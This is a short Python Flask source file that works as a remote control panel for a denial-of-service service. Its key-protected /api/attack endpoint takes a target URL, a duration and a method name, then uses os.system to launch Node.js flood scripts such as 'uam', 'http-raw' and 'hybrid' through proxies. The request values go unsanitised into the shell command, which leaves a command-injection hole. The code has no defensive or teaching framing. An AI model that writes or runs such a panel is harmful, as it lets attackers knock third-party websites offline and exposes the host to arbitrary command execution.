from flask import Flask, request, jsonify, render_template
import os
import threading

app = Flask(__name__)

key_code = 'iehsi38gIe8egd928gsog'

@app.route('/')
def home_page():
    return render_template('index.html')

def execute_attack(method, target_url, target_time, rate=120, th=5, proxy_file="proxy.txt"):
    command = f'node {method}.js {target_url} {target_time} {rate} {th} {proxy_file}'
    if method == "uam":
        command = f'node {method}.js uam {target_time} {th} {proxy_file} {rate} {target_url}'
    elif method == "http-raw":
        command = f'node {method}.js {target_url} {target_time}'
    elif method == 'hybrid':
        command = f'node {method}.js {target_url} {target_time} {th} {rate} {proxy_file}'
    print(f'ATTACK START METHOD={method} TARGET={target_url} TIME={target_time}')
    threading.Thread(target=os.system, args=(command,)).start()

@app.route('/api/attack', methods=['GET'])
def attack():
    method = request.args.get('method')
    url = request.args.get('url')
    timel = request.args.get('time')
    key_url = request.args.get('key')
    if key_url != key_code:
        return jsonify({'status': 'Authentication failed'}), 401
    execute_attack(method, url, timel)
    return jsonify({'status': 'Attack sent successfully'}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=True)